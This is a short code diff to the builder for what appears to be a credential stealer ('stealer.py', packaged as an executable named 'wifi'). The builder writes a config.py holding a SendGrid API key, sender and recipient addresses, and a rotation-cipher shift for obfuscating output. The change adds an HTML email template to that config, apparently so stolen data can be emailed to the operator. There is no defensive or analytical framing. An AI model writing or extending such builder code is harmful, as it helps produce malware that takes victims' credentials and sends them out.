@@ -11,6 +11,8 @@ class Build:
     to_email = None
     shift = random.randint(1, 25)
 
+    html_template = 'email.html'
+
     script_name = 'stealer.py'
     executable_name = 'wifi'
 
@@ -60,13 +62,17 @@ class Build:
 
         return rot_string
 
+    def get_email_tempelte(self):
+        with open(self.html_template, 'r') as template:
+            return template.read()
+
     def write_config_file(self):
         # write config file
-        content = f'''
-from_email = '{self.from_email}'
+        content = f'''from_email = '{self.from_email}'
 send_grid_api = '{self.send_grid_api}'
 to_email = '{self.to_email}'
 shift = {self.shift}
+html_email = """{self.get_email_tempelte()}"""
 '''
         with open('config.py', 'w', encoding="utf-8") as f:
             f.write(content)
